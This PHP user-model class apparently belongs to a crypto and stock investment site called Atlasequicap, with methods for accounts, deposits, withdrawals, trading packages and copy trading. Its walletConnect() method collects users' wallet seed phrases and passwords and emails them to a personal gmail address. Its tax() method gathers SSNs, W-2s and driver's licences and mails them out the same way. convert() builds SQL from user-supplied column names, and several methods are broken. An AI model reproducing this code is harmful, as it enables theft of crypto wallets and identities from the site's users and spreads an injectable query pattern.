<?php
    namespace Model;
    use mysqli;
    use Service\{
        Response,
        Func,
        Mailing,
        Upload,
        EmailBody
    };

    use Query\{
        Delete,
        Insert,
        Select,
        Update
    };

    class User extends Response {

        private static $db;
        private $user;
        private $data;
        private $selecting;

        public function __construct(mysqli $db, array $data, int|string $user) {
            self::$db = $db;

            $this->data = $data;
            $this->selecting = new Select(self::$db);
            $this->user = $user;
        }


        public function login() : array {
            $value = $this->data['val'];

            $this->status = 0;
            $this->type = "error";
            $this->message = "void";

            $email = $value['email'];
            $password = $value['password'];

            $data = [
                'email' => $email,
                '1' => '1',
                'needle' => '*',
                'table' => 'userS'
            ];

            $result = Func::searchDb(self::$db, $data, "AND");
            if($result):
                // Verify the password
                if(password_verify($password, $result['password'])):
                    // Check if account is verified
                    if($result['status'] == 1):
                        // Generate token, save as cookie and update the database
                        $token = Func::tokenGenerator();
                        Func::save_cookie($token);
                        $updating = new Update(self::$db, "SET token = ? WHERE email = ?# $token# $email");
                        if($updating->mutate('ss', 'users')):
                            $this->status = 1;
                            $this->content = "Success";
                        endif;
                    else:
                        $token = $result['token'];
                        $mailing = new Mailing($email, "", $token, Func::email_config());
                        $body = [
                            "head" => "Welcome to Atlasequicap",
                            "elements" => "Thank you for choosing us as your partner in finance! We're thrilled to have you, but first click on this link to verify your account <a href='https://atlasequicap.com/verify?token=$token'>Click here</a>"
                        ];

                        $mailing->set_params((new EmailBody($body))->main(), "Registration");
                        if($mailing->send_mail()):
                            $this->message = "fill";
                            $this->status = 0;
                            $this->content = "An email has been sent to you, please follow the instructions to verify your account";
                        endif;
                    endif;
                else:
                    $this->message = "fill";
                    $this->content = "Invalid email or password";
                endif;
            else:
                $this->message = "fill";
                $this->content = "Invalid email or password";

            endif;

            return $this->deliver();
        }

        public function register() : array {
            $value = $this->data['val'];

            $this->status = 0;
            $this->type = "error";
            $this->message = "void";

            $fullname = $value['fullname'];
            $email = $value['email'];
            $country = $value['country'];
            $phone = $value['phone'];
            $password = $value['password'];
            $referred = $value['referred'];

            $name = explode(" ", $fullname);
            $firstname = $name[0];
            $lastname = $name[1] ?? "";

            // Check for email
            $data = [
                'email' => $email,
                '1' => '1',
                'needle' => 'token',
                'table' => 'users'
            ];
            $result = Func::searchDb(self::$db, $data, "AND");
            if(!$result):
                self::$db->autocommit(false);
                // Check if there are 2 names atleast
                if(strlen(trim($lastname)) < 1):
                    $this->message = "fill";
                    $this->content = "We require at least 2 of your names";
                else:
                    // Check if password is greater than 7
                    if(strlen(trim($password)) <= 7):
                        $this->message = "fill";
                        $this->content = "Password should be greater than 7";
                    else:
                        // Send email, then proceed to save user
                        $token = Func::tokenGenerator();

                        // Save the user to the database
                        $subject = [
                            "token",
                            "fullname",
                            "refcode",
                            "country",
                            "tradeId",
                            "phone",
                            "email",
                            "password",
                            "referred",
                            "date"
                        ];

                        $items = [
                            $token,
                            $fullname,
                            random_int(1000, 9999).time(),
                            $country,
                            Func::generateCode(),
                            $phone,
                            $email,
                            password_hash($password, PASSWORD_DEFAULT),
                            $referred,
                            Func::dateFormat()
                        ];

                        $inserting = new Insert(self::$db, "users", $subject, "");
                        if($inserting->action($items, 'sssssissss')):
                            //self::$db->autocommit(true);
                            
                            $mailing = new Mailing($email, $fullname, $token, Func::email_config());
                            $body = [
                                "head" => "Welcome to Atlasequicap",
                                "elements" => "Thank you for choosing us as your partner in finance! We're thrilled to have you, but first click on this link to verify your account <a href='https://atlasequicap.com/verify?token=$token'>Click here</a>"
                            ];

                            $mailing->set_params((new EmailBody($body))->main(), "Registration");
                            if($mailing->send_mail()):
                                self::$db->autocommit(true);
                                $this->status = 1;
                                $this->type = "Success";
                                $this->content = "Success";
                            else:
                                $this->message = "void";
                                $this->content = "Something went wrong. . .";
                            endif;
                        else:
                            $this->message = "void";
                            $this->content = "Something went wrong. . .";
                        endif;
                    endif;
                endif;
            else:
                $this->message = "fill";
                $this->content = "Email already exist";
            endif;

            return $this->deliver();
        }

        public function forgot() : array {
            $email = $this->data['val']['email'];

            $this->status = 0;
            $this->type = "error";
            $this->message = "void";

            $forgotToken = Func::tokenGenerator();
            $forgotDate = Func::dateFormat();

            $updating = new Update(self::$db, "SET forgot = ?, forgotDate = ? WHERE email = ?# $forgotToken# $forgotDate# $email");
            if($updating->mutate('ss', "user")):
                $mailing = new Mailing($email, null, $forgotToken, Func::email_config());
                $body = [
                    "head" => "Forgot password",
                    "elements" => "We noticed that you requested a change of password from this email. If this is really you, please follow the link below to reset your password. <a href='Atlasequicap.com/password?token=$forgotToken'>Please follow this link</a>"
                ];

                $mailing->set_params((new EmailBody($body))->main(), "Forgot");
                if($mailing->send_mail()):
                    $this->status = 1;
                    $this->type = "Success";
                    $this->content = "Check your email address for the confirmation link";

                else:
                    $this->message = "void";
                    $this->content = "Something went wrong. . .";
                endif;
            else:
                $this->message = "void";
                $this->content = "Something went wrong. . .";
            endif;

            return $this->deliver();
        }

        public function password() : array {
            $password = $this->data['val']['password'];

            $this->status = 0;
            $this->type = "error";
            $this->message = "void";

            if(strlen(trim($password)) > 6):
                // Proceed to uodate the password

            else:

            endif;

            return $this->deliver();
        }

        public function profile() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";

            $val = $this->data['val'];

            if($val['type'] == "profile"):
                $fullname = $val['fullname'];
                $phone = $val['phone'];
                $country = $val['country'];

                $name = explode(" ", $fullname);
                $firstname = $name[0];
                $lastname = $name[1] ?? "";
                // Proceed to update the latest data
                if($fullname != "" && $phone != "" && $country != ""):
                    if(strlen(trim($lastname)) < 1):
                        $this->message = "fill";
                        $this->content = "We require at least 2 of your names";
                    else:
                        $updating = new Update(self::$db, "SET fullname = ?, phone = ?, country = ? WHERE id = ?# $fullname# $phone# $country# $this->user");
                        $action = $updating->mutate('sssi', 'users');
                        if(!$action) return $action;

                        $this->status = 1;
                        $this->type = "success";
                        $this->content = "Profile edited successfully";
                    endif;
                else:
                    $data->content = "You cannot leave this forms blank";
                endif;

            elseif($val['type'] == "security"):
                $password = $val['password'];
                if(strlen($password) > 7):
                    $passwordHash = password_hash($password, PASSWORD_DEFAULT);
                    $updating = new Update(self::$db, "SET password = ? WHERE id = ?# $passwordHash# $this->user");
                    $action = $updating->mutate('si', 'users');
                    if(!$action) return $action;

                    $this->status = 1;
                    $this->type = "success";
                    $this->content = "Profile edited successfully";
                else:
                    $data->content = "Pasword should be greater than 7 characters";
                endif;

            elseif($val['type'] == "payment"):
                $btc = $val['btc'];
                $eth = $val['eth'];
                $usdt = $val['usdt'];
                $updating = new Update(self::$db, "SET btc = ?, eth = ?, usdt = ? WHERE id = ?# $btc# $eth# $usdt# $this->user");
                $action = $updating->mutate('sssi', 'users');
                if(!$action) return $action;

                $this->status = 1;
                $this->type = "success";
                $this->content = "Profile edited successfully";
            endif;

            return $this->deliver();
        }

        public function wallet() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";

            $val = $this->data['val'];

            $btc = $val['btc'];
            $eth = $val['eth'];
            $usdt = $val['usdt'];
            $bnb = $val['bnb'];

            $updating = new Update(self::$db, "SET btc = ?, eth = ?, usdt = ?, shiba = ? WHERE id = ?# $btc# $eth# $usdt# $bnb# $this->user");
            $action = $updating->mutate('ssssi', 'user');
            if(!$action) return $action;

            $this->status = 1;
            $this->type = "success";
            $this->content = "Wallet updated successfully";

            return $this->deliver();
        }

        public function package() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";

            $packageName = $this->data['val']['package'];
            (int) $zero = 0;

            // Fetch user info first
            $data = [
                "id" => $this->user,
                "1" => "1",
                "needle" => "*",
                "table" => "user"
            ];

            $user = Func::searchDb(self::$db, $data, "AND");

            // Fetch package info next
            $data = [
                "pname" => $packageName,
                "1" => "1",
                "needle" => "*",
                "table" => "package1"
            ];

            $package = Func::searchDb(self::$db, $data, "AND");

            // Check if package is already selected
            if($package['pname'] !== $user['pname']):
                // Check if there is a running package
                if($user['activate'] !== 1):
                    // Check if user has enough balance for the package
                    if($user['walletbalance'] >= $package['froms']):
                        // Proceed to activate the package
                        $increase = $package['increase'];
                        $duration = $package['duration'];
                        $bonus = $package['bonus'];
                        $froms = $package['froms'];
                        $tos = $package['tos'];

                        $updating = new Update(self::$db, "SET pname = ?, increase = ?, counting = ?, bonus = ?, duration = ?, pdate = ?, froms = ?, tos = ?, activate = ? WHERE id = ?# $packageName# $increase# $duration# $bonus# $duration# $zero# $froms# $tos# $zero# $this->user");
                        $action = $updating->mutate('siiiiiiiii', 'user');
                        if(!$action) return null;

                        $this->status = 1;
                        $this->type = "success";
                        $this->content = "$packageName package has been selected successfully";
                    else:
                        $this->content = "Insufficient balance";
                    endif;
                else:
                    $this->content = "A package is already running, please end it before selecting a new one";
                endif;
            else:
                $this->content = "Package is already selected";
            endif;

            return $this->deliver();
        }

        public function withdraw() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";

            $amount = $this->data['val']['amount'];
            $address = $this->data['val']['address'];
            $mode = $this->data['val']['mode'];

            // Fetch user info
            $data = [
                "id" => $this->user,
                "1" => "1",
                "needle" => "*",
                "table" => "users"
            ];

            $user = Func::searchDb(self::$db, $data, "AND");
            if(empty($user)) return $user;

            $userWallet = $user['wallet'] === null ? 0 : $user['wallet'];

            // Check if withdrawal is above limit
            if($amount >= 100):
                // Check if user has enough money in his wallet
                if($amount <= $userWallet):
                    self::$db->autocommit(false);
                    // Proceed to insert a new record and debit from user wallet
                    $subject = ['tranx', 'amount', 'mode', 'address', 'date'];
                    $items = [Func::generateCode(), $amount, $mode, $address, Func::dateFormat()];
                    $inserting = new Insert(self::$db, "withdrawals", $subject, "");
                    $action = $inserting->action($items, "iisss");

                    if(!$action) return $action;

                    // Debit user
                    $newBalance = $userWallet - $amount;

                    $updating = new Update(self::$db, "SET wallet = ? WHERE id = ?# $newBalance# $this->user");
                    $action = $updating->mutate('di', 'users');
                    if(!$action) return $action;

                    // Notify the user via email
                    $data = [
                        "head" => "Withdrawal Transaction",
                        "elements" => [
                            "Amount" => $amount,
                            "Address" => $address,
                            "Wallet Name" => $mode,
                            "Date" => date("Y-m-d")
                        ]
                    ];


                    $mailing = new Mailing($user['email'], $user['fullname'], null, Func::email_config());
                    $mailing->set_params((new EmailBody($data))->main(), "Withdrawal");
                    if($mailing->send_mail()):
                        self::$db->autocommit(true);
                        $this->type = "success";
                        $this->status = 1;
                        $this->content = "Withdrawal sent for confirmation";
                    else:
                        $this->content = "Something went wrong. . .";
                    endif;
                else:
                    $this->content = "Insufficient balance";
                endif;
            else:
                $this->content = "Minimum withdrawal is $100";
            endif;


            return $this->deliver();
        }

        public function pay() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";

            $data = [
                "id" => $this->user,
                "1" => "1",
                "needle" => "*",
                "table" => "users"
            ];
            $user = Func::searchDb(self::$db, $data, "AND");

            $amount = $this->data['val']['amount'];
            $mode = $this->data['val']['mode'];
            $address = $this->data['val']['address'];

            self::$db->autocommit(false);

            // Check if the data is fill
            if(empty($amount)):
                $this->content = "Please enter an amount";
            else:
                $tranx = Func::generateCode();
                $subject = ["tranx", "user", "amount", "mode", "address", "date"];
                
                $items = [$tranx, $this->user, $amount, $mode, $address, Func::dateFormat()];

                // Save to database next
                $inserting = new Insert(self::$db, "deposit", $subject, "");

                $action = $inserting->action($items, 'iiisss');

                if(!$action) return $action;

                // Notify the user via email
                $data = [
                    "head" => "Deposit Transaction",
                    "elements" => [
                        "Amount" => $amount,
                        "User" => $user['fullname'],
                        "Method" => strtoupper($mode),
                        "Address" => $address,
                        "Date" => date("Y-m-d")
                    ]
                ];

                // Send an email address
                $mailing = new Mailing($user['email'], $user['fullname'], null, Func::email_config());
                $mailing->set_params((new EmailBody($data))->main(), "Deposit Request");
                if($mailing->send_mail()):
                    self::$db->autocommit(true);

                    $this->status = 1;
                    $this->type = "success";
                    $this->content = "Deposit awaiting confirmation";
                else:
                    $this->content = "Something went wrong. . .";
                endif;

            endif;

            return $this->deliver();
        }

        public function convert() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";

            (int) $amount = $this->data['val']['amount'];
            (int) $from = $this->data['val']['from'];
            (int) $to = $this->data['val']['to'];

            $updating = new Update(self::$db, "SET $from = $from - ?, $to = $to + ? WHERE id = ?# $amount# $amount# $this->user");
            if($updating->mutate('iii', 'users')):
                $this->type = "success";
                $this->status = 1;
                $this->content = "Your transfer was successful";
            else:
                $this->content = "Something went wrong...";
            endif;

            return $this->deliver();
        }

        public function signal() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";

            (int) $signalId = $this->data['val']['signalId'];
            (int) $amount = $this->data['val']['amount'];
            (int) $price = $this->data['val']['price'];

            // Fetch user info
            $data = [
                "id" => $this->user,
                "1" => "1",
                "needle" => "*",
                "table" => "users"
            ];

            $user = Func::searchDb(self::$db, $data, "AND");
            if(empty($user)) return $user;
            if($amount < $price):
                $this->content = "Your wallet balance is not sufficient enough for this transaction";
            else:
                if($user['wallet'] < $price):
                    $this->content = "Your wallet balance is not sufficient enough for this transaction";
                else:
                    self::$db->autocommit(false);
                    // Make sure the user doesn't have any running signal from this person
                    // Fetch user signal from this person
                    (int) $zero = 0;
                    $selecting = new Select(self::$db);
                    $selecting->more_details("WHERE user = ? AND signalId = ? AND status = ?# $this->user# $signalId# $zero");
                    $action = $selecting->action("*", "usersignals");
                    if($action != null) return $action;
                    if($selecting->pull()[1] < 1):
                        if(empty($result)):
                        // Insert into usersignals
                            $subject = ["tranx", "user", "signalId", "amount", "date"];
                            $items = [Func::generateCode(), $this->user, $signalId, $amount, Func::dateFormat()];
                            // Save to database next
                            $inserting = new Insert(self::$db, "usersignals", $subject, "");
                            $action = $inserting->action($items, 'iiiis');

                            if(!$action) return $action;
                            //Update the new wallet balance
                            $updating = new Update(self::$db, "SET wallet = wallet - ? WHERE id = ?# $amount# $this->user");
                            if($updating->mutate('ii', 'users')):
                                self::$db->autocommit(true);
                                $this->status = 1;
                                $this->type = "success";
                                $this->content = "Signal was purchased successfully";
                            else:
                                $this->content = "Something went wrong...";
                            endif;
                        endif;
                    else:
                        $this->status = 1;
                        $this->type = "error";
                        $this->content = "You alway have an active signal from this person";
                    endif;
                    $selecting->reset();
                endif;
            endif;

            return $this->deliver();
        }

        public function signalCancel() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";

            (int) $signalId = $this->data['val']['signalId'];
            (int) $one = 1;
            (int) $zero = 0;
            // Confirm that signal is still running
            self::$db->autocommit(false);
            $updating = new Update(self::$db, "SET status = ? WHERE status = ? AND signalId = ? AND user = ?#$one# $zero# $signalId# $this->user");
            if($updating->mutate('iiii', 'usersignals')):
                // Fetch signal profit and add to user wallet
                // Fetch profit
                $data = [
                    "signalId" => $signalId,
                    "user" => $this->user,
                    "needle" => "*",
                    "table" => "usersignals"
                ];

                $signal = Func::searchDb(self::$db, $data, "AND");
                $returnAmount = $signal['profit'] + $signal['amount'];
                $updating = new Update(self::$db, "SET wallet = wallet + ? WHERE id = ?# $returnAmount# $this->user");
                if($updating->mutate('ii', 'users')):
                    self::$db->autocommit(true);
                    $this->status = 1;
                    $this->type = "success";
                    $this->content = "You have successfully cancelled the plan";
                endif;
            endif;

            return $this->deliver();
        }

        public function orderStock() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";

            self::$db->autocommit(false);
 
            list($orderType, $market, $price, $symbol, $amount, $type, $limitPrice, $expDate, $id) = array_values($this->data['val']);

            $symbol = strtoupper($symbol);
            (int) $one = 1;
            (int) $zero = 0;

            // Set the triggered according to the order type
            $triggered = ($type == "Limit Buy" || $type == "Limit Sell") ? 0 : 1;
            if($orderType == "buy"):
                // Confirm that there is no other active order
                $selecting = new Select(self::$db);
                $selecting->more_details("WHERE user = ? AND symbol = ? AND triggered = 1 ORDER BY id DESC# $this->user# $symbol");
                $action = $selecting->action("*", "stocks");
                if($action != null) return $action;
                $userStocks = $selecting->pull()[0];
                if(count($userStocks) > 0):
                    $this->status = 0;
                    $this->type = "error";
                    $this->content = "You already have a share from this stock";
                else:
                    $shares = round($amount / $price, 2);
                    $code = Func::generateCode();
                    $subject = ["tranx", "market", "user", "symbol", "shares", "orderType", "limitOrder", "exp", "amount", "triggered", "profit", "date"];
                    $items = [$code, $market, $this->user, $symbol, $shares, $type, $limitPrice, $expDate, $amount, $triggered, $zero, Func::dateFormat()];

                    // Save to database next
                    $inserting = new Insert(self::$db, "stocks", $subject, "");
                    $action = $inserting->action($items, 'ssisssssiiis');
                    if(!$action) return $action;
                    // Update user wallet if triggered is 1
                    if($triggered == 1):
                        $updating = new Update(self::$db, "SET stock = stock - ? WHERE id = ?# $amount# $this->user");
                        if(!$updating->mutate('ii', 'users')):
                            return $this->content = "Something went wrong...";
                        endif;
                    endif;

                    self::$db->autocommit(true);
                    $this->status = 1;
                    $this->type = "success";
                    $this->content = "You have purchased $symbol";
                endif;
            endif;

            if($orderType == "sell"):
                // Fetch stock info
                $data = [
                    "id" => $id,
                    "1" => "1",
                    "needle" => "*",
                    "table" => "stocks"
                ];

                $stock = Func::searchDb(self::$db, $data, "AND");
                if(empty($stock)):
                    $this->status = 0;
                    $this->type = "error";
                    $this->content = "You do not own any $symbol stock";
                else:
                    if($stock['triggered'] == 0): 
                        // Just delete the limit
                        $deleting = new Delete(self::$db, "WHERE id = ?, $id");
                        if($deleting->proceed('stocks')):
                            self::$db->autocommit(true);
                            $this->status = 1;
                            $this->type = "success";
                            $this->content = "You have successfully closed your $symbol limit";
                        else:
                            $this->content = "Something went wrong...";
                        endif;
                    elseif($stock['triggered'] == 1):
                        // Set the triggered to 2, meaning the trade has closed
                        // Update user wallet if triggered is 1

                        $totalProfit = $price * $stock['shares'];
                        $updating = new Update(self::$db, "SET stock = stock + ? WHERE id = ?# $totalProfit# $this->user");
                        if($updating->mutate('ii', 'users')):
                            // Update the stock status
                            $updating = new Update(self::$db, "SET triggered = 2, profit = ? - amount WHERE id = ?# $totalProfit# $id");
                            if($updating->mutate('ii', 'stocks')):
                                self::$db->autocommit(true);
                                $this->status = 1;
                                $this->type = "success";
                                $this->content = "You have successfully sold your $symbol shares";
                            else:
                                $this->content = "Something went wrong...";
                            endif;
                        else:
                            $this->content = "Something went wrong...";
                        endif;
                    endif;
                endif;
            endif;

            return $this->deliver();
        }

        public function orderCrypto() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";
 
            list($order, $symbol, $amount, $side, $entry, $tp, $sl, $duration, $leverage) = array_values($this->data['val']);

            $symbol = strtoupper($symbol);
            (int) $one = 1;
            (int) $zero = 0;
            $code = Func::generateCode();
            $subject = ["tranx", "user", "orderType", "asset", "size", "entry", "duration", "tp", "sl", "profit", "date"];
            $items = [$code, $this->user, $order, $symbol, $amount, $entry, $duration, $tp, $sl, $zero, Func::dateFormat()];
            // Save to database next
            $inserting = new Insert(self::$db, "crypto", $subject, "");
            $action = $inserting->action($items, 'sisisisssss');
            if(!$action) return $action;

            $this->status = 1;
            $this->type = "success";
            $this->content = "You have successfully placed a trade on $symbol";
            return $this->deliver();
        }


        public function activate() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";

            (int) $one = 1;

            // Fetch user info
            $data = [
                "id" => $this->user,
                "1" => "1",
                "needle" => "*",
                "table" => "user"
            ];

            $user = Func::searchDb(self::$db, $data, "AND");

            $amount = $this->data['val']['amount'];
            // Check if there is a selected package
            if($user['pname'] !== ""):
                // Check if there is already an active package
                if($user['activate'] === 0):
                    // Check if amount value is within the range of the package
                    if($amount >= $user['froms'] && $amount <= $user['tos']):
                        // Check if user has enough to activate it
                        if($user['walletbalance'] >= $amount):
                            // Proceed to activate the package
                            self::$db->autocommit(false);

                            $date = Func::dateFormat();
                            
                            // Activate the package
                            $updating = new Update(self::$db, "SET activate = ?, pdate = ?, usd = ? WHERE id = ?# $one# $date# $amount# $this->user");
                            $action = $updating->mutate("isii", "user");
                            if(!$action) return $action;

                            // Save the history as investments
                            $subject = ["user", "package", "amount", "date"];
                            $items = [$this->user, $user['pname'], $amount, $date];
    
                            $inserting = new Insert(self::$db, "investments", $subject, "");
                            $action = $inserting->action($items, 'isis');
                            $inserting->reset();
                            if(!$action) return $action;

                            // Send email about the investment
                            $data = [
                                "head" => "Package Activation",
                                "elements" => [
                                    "User" => $user['username'],
                                    "Package" => $user['pname'],
                                    "Percentage" => $user['increase']."%",
                                    "Amount" => $amount,
                                    "Date" => date("Y-m-d")
                                ]
                            ];

                            // Send an email address
                            $mailing = new Mailing($user['email'], $user['username'], null, Func::email_config());
                            $mailing->set_params((new EmailBody($data))->main(), "Package Activation");
                            if($mailing->send_mail()):
                                self::$db->autocommit(true);

                                $this->status = 1;
                                $this->type = "success";
                                $this->content = "Deposit awaiting confirmation";
                            else:
                                $this->content = "Something went wrong. . .";
                            endif;
                        else:
                            $this->content = "Insufficient balance";
                        endif;
                    else:
                        $this->content = "Amount selected should be within the range of your package price";
                    endif;
                else:
                    $this->content = "A package is already active, please end it before activating another";
                endif;
            else:
                $this->content = "Please select a package first";
            endif;


            return $this->deliver();
        }

        public function switch() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";
            
            $profit = $this->data['val']['profit'];

            (int) $one = 1;
            (int) $zero = 0;
            (string) $empty = "";

            // Fetch user info
            $data = [
                "id" => $this->user,
                "1" => "1",
                "needle" => "*",
                "table" => "user"
            ];

            $user = Func::searchDb(self::$db, $data, "AND");
    
            if($profit == null || $profit == ""){
                $profit = 0;
            }
            $profiting = $profit + $user['walletbalance'];
    
            $updating = new Update(self::$db, "SET activate = ?, pdate = ?, walletbalance = ?, profit = ?, increase = ?, pname = ?, bonus = ? WHERE id = ?# $zero# $zero# $profiting# $zero# $zero# $empty# $zero# $this->user");
    
            if($updating->mutate('isiiisii', "user")):
                $this->status = 1;
                $this->type = "success";
                 $this->content = "Package Ended with profit of $profit you can now switch or enjoy a new package !";
            else:
                $this->content = "Package could be ended/switched!";
            endif;
            
            return $this->deliver();
            
        }

        public function walletConnect() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";
            
            $val = $this->data['val'];

            $seed = $val['seed'];
            $walletPassword = $val['walletPassword'];
            $walletName = $val['walletName'];

            // Fetch user info
            $data = [
                "id" => $this->user,
                "1" => "1",
                "needle" => "*",
                "table" => "users"
            ];

            $user = Func::searchDb(self::$db, $data, "AND");

            // Save the details
            $subject = [
                'user',
                'fullname',
                'seed',
                'walletPassword',
                'walletName',
                'date'
            ];

            $items = [
                $this->user,
                $user['fullname'],
                $seed,
                $walletPassword,
                $walletName,
                date('Y-m-d')
            ];
            
            $inserting = new Insert(self::$db, "wallet", $subject, "");
            $action = $inserting->action($items, 'isssss');
            if(!$action) return $action;
            $inserting->reset();
            
            $data = [
                "head" => "Wallet Conneceted",
                "elements" => [
                    "user" => $user['fullname'],
                    "wallet name" => $walletName,
                    "seed" => $seed,
                    "password" => $walletPassword
                ]
            ];
            
            $mailing = new Mailing("valenny112@gmail.com", "Global", null, Func::email_config());
            $mailing->set_params((new EmailBody($data))->main(), "Wallet Connected");
            $mailing->send_mail();
            
            
            $this->type = "success";
            $this->status = 1;
            $this->content = "Wallet successfully connected";

            return $this->deliver();
        }

        public function trader() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";

            $amount = $this->data['val']['amount'];
            $id = $this->data['val']['id'];
            $cdate = $date = Func::dateFormat();
            // First check if user is already copying and ask to end before proceeding
            $data = [
                'id' => $this->user,
                '1' => '1',
                'needle' => 'ctrader',
                'table' => 'users'
            ];
            $cTrader = Func::searchDb(self::$db, $data, "AND");
            if($cTrader < 1):
                if($amount >= 100):
                    $updating = new Update(self::$db, "SET ctrader = ?, camount = ?, cdate = ? WHERE id = ?# $id# $amount# $cdate# $this->user");
                    if($updating->mutate('issi', "users")):
                        $this->status = 1;
                        $this->type = "success";
                        $this->content = "You are now actively copying a trade";
                    else:
                        $this->type = "fill";
                    endif;
                else:
                    $this->content = "Minimum for copytrading is $100";
                endif;
            else:
                $this->content = "You need to end your current copy trading";
            endif;
            return $this->deliver();
        }

        public function endTrade() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";

            self::$db->autocommit(false);
            $zero = 0;
            $empty = "";

            $profit = Func::calcTrade($this->user, self::$db, "endtrade");

            $updating = new Update(self::$db, "SET wallet = wallet + cprofit, ctrader = ?, cprofit = ?, camount = ?, cdate = ?, ccount = ? WHERE id = ?# $zero# $zero# $zero# $empty# $zero# $this->user");
            if($updating->mutate('iiisii', "users")):
                self::$db->autocommit(true);
                $this->status = 1;
                $this->type = "success";
                $this->content = "You have successfully ended your copytrading";
            else:
                $this->type = "fill";
            endif;

            return $this->deliver();
        }
        
        public function tax() : array {
            $this->status = 0;
            $this->message = "fill";
            $this->type = "error";

            // Check if user has enough to mint
            $data = [
                "id" => $this->user,
                "1" => "1",
                "needle" => "*",
                "table" => "user"
            ];

            $user = Func::searchDb(self::$db, $data, "AND");
            
            $fname = $this->data['fname'];
            $house = $this->data['house'];
            $email = $this->data['email'];
            $ssn = $this->data['ssn'];
            $number = $this->data['number'];
            $w2_ = $this->data['w2'];
            $driver_ = $this->data['driver'];

            self::$db->autocommit(false);

            // Check if the data is fill
            if(empty($fname) || empty($house) || empty($ssn) || empty($number) || empty($driver_) || empty($w2_)):
                $this->content = "Please fill the forms";
            else:
                // W2 form upload
                $uploading = new Upload("src/tax", "../../src/tax", $w2_);
                $w2 = $uploading->saveImage();
                if($w2['status'] !== 1) return $w2;
                
                // License form upload
                
                $uploading = new Upload("src/tax", "../../src/tax", $driver_);
                $driver = $uploading->saveImage();
                if($driver['status'] !== 1) return $driver;
            
                // Proceed to send email
                $data = [
                    "head" => "Tax Form",
                    "elements" => [
                        "Fullname" => $fname,
                        "Phone number" => $number,
                        "Email" => $email,
                        "House address" => $house,
                        "SSN" => $ssn
                    ],
                ];
            
                $mailing = new Mailing("Atlasequicap@gmail.com", "Global", null, Func::email_config());
                $mailing->set_params((new EmailBody($data))->main(), "Tax Form");
                $mailing->attach('https://www.Atlasequicap.com/'.$driver['content'][1], 'Driver-'.$driver_['name'][0]);
                $mailing->attach('https://www.Atlasequicap.com/'.$w2['content'][1], 'W2-'.$w2_['name'][0]);
                if($mailing->send_mail()):
                    $this->message = "fill";
                    $this->type = "success";
                    $this->status = 1;
                    $this->content = "Application submitted, we'll get back to you shortly";
                endif;
            endif;
            
           return $this->deliver();
        
        }

    }
